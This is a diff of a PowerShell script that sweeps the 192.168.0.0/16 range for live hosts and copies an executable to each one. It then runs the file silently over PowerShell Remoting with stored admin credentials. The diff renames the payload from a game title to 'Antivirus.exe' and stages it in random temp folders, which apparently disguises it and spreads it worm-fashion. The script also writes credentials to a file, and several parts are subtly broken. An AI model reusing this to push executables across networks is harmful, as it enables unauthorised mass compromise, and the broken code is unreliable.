@@ -2,45 +2,124 @@ function random_text {
     return -join ((97..122)+(65..90) | Get-Random -Count 5 | % {[char]$_})
 }
 
-# Enable PowerShell Remoting
 Enable-PSRemoting -Force
 
-# Function to scan the network for active IPs
 function Get-ActiveIPs {
-    $subnet = "192.168.1."
+    $baseSubnet = "192.168."
     $activeIPs = @()
-
-    for ($i = 1; $i -le 254; $i++) {
-        $ip = $subnet + $i
-        if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
-            $activeIPs += $ip
+    for ($j = 1; $j -le 254; $j++) {
+        $subnet = $baseSubnet + $j + "."
+        for ($i = 1; $i -le 254; $i++) {
+            $ip = $subnet + $i
+            try {
+                if (Test-Connection -ComputerName $ip -Count 1 -TimeoutSeconds 5 -Quiet) {
+                    $activeIPs += $ip
+                }
+            }
+            catch {
+                Log-Message "Failed to ping $ip"
+            }
         }
     }
     return $activeIPs
 }
 
-# Define the path to the antivirus installer
 $wd = random_text
 $path = "$env:temp\$wd"
-$installer = "$path\AssassinsCreed_SE.exe"
-
-# Scan the network and collect IPs
+$installer = "$path\Antivirus.exe"
 $targets = Get-ActiveIPs
-$desktoppath = [System.Environment]::GetFolderpath("Desktop")
+$desktoppath = [System.Environment]::GetFolderPath("Desktop")
 
-mkdir $path
+if (-not (Test-Path $installer)) {
+    Write-Error "Installer not found at $installer"
+    exit
+}
 
-# Loop through each target computer
+# mkdir $path
+
+$logFile = "$env:temp\deployment_log.txt"
+$credentialPath = "$env:USERPROFILE\Documents\adminCreds.xml"
+
+# Save credentials securely
+$cred = Get-Credential
+$cred | Export-Clixml -Path $credentialPath
+
+# Retrieve credentials securely
+$adminCreds = Import-Clixml -Path $credentialPath
+
+function Log-Message {
+    param (
+        [string]$message
+    )
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    Add-Content -Path $logFile -Value "[$timestamp] $message"
+}
+
+function Invoke-Retry {
+    param (
+        [scriptblock]$scriptblock,
+        [int]$retries = 3,
+        [int]$delay = 5
+    )
+
+    for ($i = 1; $i -le $retries; $i++) {
+        try {
+            & $scriptblock
+            return $true
+        } catch {
+            Log-Message "Attempt $i failed: $_"
+            Start-Sleep -Seconds $delay
+        }
+    }
+    return $false
+}
+
+$maxJobs = 10
+$jobQueue = @()
+
 foreach ($target in $targets) {
-    Write-Output "Deploying to $target..."
+    while ($jobQueue.Count -ge $maxJobs) {
+        $completedJobs = $jobQueue | Where-Object { $_.State -eq 'Completed' }
+        $completedJobs | ForEach-Object {
+            Receive-Job -Job $_
+            Remove-Job -Job $_
+            $jobQueue.Remove($_)
+        }
+        Start-Sleep -Seconds 1
+    }
 
-    # Copy the antivirus installer to the target computer
-    Copy-Item -path $installer -Destination $desktoppath
+    $job = Start-Job -ScriptBlock {
+        param ($installer, $target, $adminCreds)
+        try {
+            $randomFolder = [System.IO.Path]::Combine($env:TEMP, (Get-Random -Count 5 | ForEach-Object { [char]$_ } -join ''))
+            New-Item -Path $randomFolder -ItemType Directory -ErrorAction Stop
+            Copy-Item -Path $installer -Destination "$randomFolder\Antivirus.exe" -ErrorAction Stop
+            $desktoppath = [System.Environment]::GetFolderPath("Desktop")
 
-    # Execute the antivirus installer on the target computer using PowerShell Remoting
-    Invoke-Command -ComputerName $target -ScriptBlock {
-        Start-Process -Filepath "$desktoppath\AssassinsCreed_SE.exe" -ArgumentList "/silent" -Wait
-    } -Credential (Get-Credential)
+            Invoke-Command -ComputerName $target -ScriptBlock {
+                param ($randomFolder, $desktoppath)
+                $tempInstallerPath = "$randomFolder\Antivirus.exe"
+                Copy-Item -Path $tempInstallerPath -Destination $desktoppath -ErrorAction Stop
+                Start-Process -FilePath "$desktoppath\Antivirus.exe" -ArgumentList "/silent" -Wait
+            } -ArgumentList $randomFolder, $desktoppath -Credential $adminCreds -ErrorAction Stop
+        }
+        catch {
+            Log-Message "Failed to deploy to $target: $_"
+        }
+    } -ArgumentList $installer, $target, $adminCreds
+
+    $jobQueue += $job
+}
+
+# Wait for remaining jobs to complete
+while ($jobQueue.Count -gt 0) {
+    $completedJobs = $jobQueue | Where-Object { $_.State -eq 'Completed' }
+    $completedJobs | ForEach-Object {
+        Receive-Job -Job $_
+        Remove-Job -Job $_
+        $jobQueue.Remove($_)
+    }
+    Start-Sleep -Seconds 1
 }
 
 Write-Output "All tasks completed."
